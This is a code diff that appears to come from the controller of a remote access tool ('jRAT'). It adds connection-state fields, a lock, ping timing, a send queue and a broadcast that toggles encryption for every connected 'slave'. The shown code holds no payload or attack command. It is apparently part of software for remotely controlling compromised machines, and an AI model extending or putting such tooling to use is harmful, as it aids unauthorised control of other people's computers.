@@ -6,10 +6,13 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 import java.security.PublicKey;
+import java.util.Random;
 
 import su.jrat.client.exceptions.CloseException;
 import su.jrat.client.ip2c.Country;
 import su.jrat.client.net.PortListener;
+import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import su.jrat.client.packets.outgoing.Packet99Encryption;
 import su.jrat.client.settings.Settings;
 import su.jrat.client.ui.panels.PanelMainLog;
 import su.jrat.client.utils.FlagUtils;
@@ -31,6 +34,16 @@ public abstract class AbstractSlave implements Runnable {
 	protected String country;
 	protected PublicKey rsaKey;
 	protected byte[] key;
+	protected boolean responded = false;
+	protected boolean verified = false;
+	protected boolean checked = false;
+	protected boolean selected = false;
+	protected boolean lock = false;
+	protected long pingms = 0;
+	protected long sent = 0;
+	protected long received = 0;
+	protected final long uniqueId = (new Random()).nextLong();
+	protected int ping = 0;
 
 	private String ip;
 	private String host;
@@ -197,5 +210,55 @@ public abstract class AbstractSlave implements Runnable {
 
 		return s;
 	}
+	
+	public byte[] getKey() {
+		return key;
+	}
+	
 
+	public void lock() {
+		lock = !lock;
+	}
+
+	public static final synchronized void toggleEncryption(boolean b) {
+		encryption = b;
+
+		for (AbstractSlave slave : Main.connections) {
+			slave.addToSendQueue(new Packet99Encryption(b));
+		}
+
+	}
+
+	public boolean isLocked() {
+		return lock;
+	}
+
+	public long getUniqueId() {
+		return uniqueId;
+	}
+	
+	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
+		while (lock) {
+			try {
+				Thread.sleep(10L);
+			} catch (Exception ex) {
+				ex.printStackTrace();
+			}
+
+		}
+		try {
+			sendPacket(packet, dos);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+	
+	public abstract void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception;
+
+	public abstract void ping() throws Exception;
+
+	public void beginPing() throws Exception {
+		pingms = System.currentTimeMillis();
+		ping();
+	}
 }
